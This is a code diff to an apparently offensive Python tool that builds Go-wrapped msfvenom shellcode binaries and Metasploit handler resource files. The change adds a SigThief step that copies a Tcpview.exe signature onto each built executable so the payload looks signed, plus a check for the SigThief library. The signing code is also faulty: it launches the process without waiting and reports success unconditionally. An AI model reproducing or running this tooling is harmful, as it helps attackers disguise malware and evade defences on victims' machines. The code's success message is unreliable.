@@ -6,7 +6,7 @@ import sys
 import os
 import argparse
 import hashlib
-import os
+import subprocess, shlex
 import random
 import string
 import yaml
@@ -62,6 +62,10 @@ def safechecks(appdir):
 		bad = 1
 	if not os.path.isfile('{0}/src/main.go'.format(appdir)):
 		cprint("[-] File not found: {0}/src/main.go".format(appdir), "red")
+		bad = 1
+
+	if not os.path.isfile('{0}/libs/sigthief.py'.format(appdir)):
+		cprint("[-] Sigthief not found: {0}/libs/sigthief.py".format(appdir), "red")
 		bad = 1
 
 	if not os.path.isdir('{0}/shellcode'.format(appdir)):
@@ -172,6 +176,13 @@ def msfvenom_generator(platform,arch,shellcodedir,shellcodename,lhost,lport,msfp
 	print("[+] You can use this resource file : ",colored(rcfile,'blue'))
 	cprint(rc,'blue')
 
+# Using sigthief (https://github.com/secretsquirrel/SigThief) to add an (invalid) signature to the binary
+def sign_binary(biname,outputdir,signature="signatures/Tcpview.exe_sig"):
+	print("[+] Using SigThief to sign the binary with the signature",colored(signature,"yellow"))
+	cmd = "python3 libs/sigthief.py -t {0}/{1} -s {2} -o {0}/{1}_signed.exe".format(outputdir,biname,signature)
+	subprocess.Popen(shlex.split(cmd), stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+	# if 'Signature append' in _popen:
+	print("[+] Signature add ! Binary signed is:",colored("{0}_signed.exe".format(biname),"green"))
 # create the resource file for msf
 def msfvenom_generator_rc(payload,lhost,lport):
 	rc = "use exploit/multi/handler\n"
@@ -201,6 +212,7 @@ if __name__ == '__main__':
 	_msfvenomargs86 = config['msfvenomargs86']
 	_msfvenomargs64 = config['msfvenomargs64']
 	_platform = config['platform']
+	_signature = config['signature']
 	
 	safechecks(_appdir)
 
@@ -224,6 +236,7 @@ if __name__ == '__main__':
 		cprint("[-] Test mode activate : ignoring all options, using default.","yellow")
 		craftbinary(_shellcodefile,_outputdir, "test_calc.exe",_appdir)
 		buildbinary("windows", "386", _outputdir,"test_calc.exe")
+		sign_binary("test_calc.exe",_outputdir,_signature)
 		sys.exit()
 
 	# ARCH
@@ -271,6 +284,7 @@ if __name__ == '__main__':
 
 	# BINARY BUILDING
 	buildbinary(goos, goarch, _outputdir, _biname)
+	sign_binary(_biname,_outputdir,_signature)
 	if args.rc and args.msfvenom:
 		cprint("[-] Running msfconsole with associated resource file...", "blue")
 		cmd = os.system("msfconsole -r {0}/{1}.rc".format(_shellcodedir,_biname))
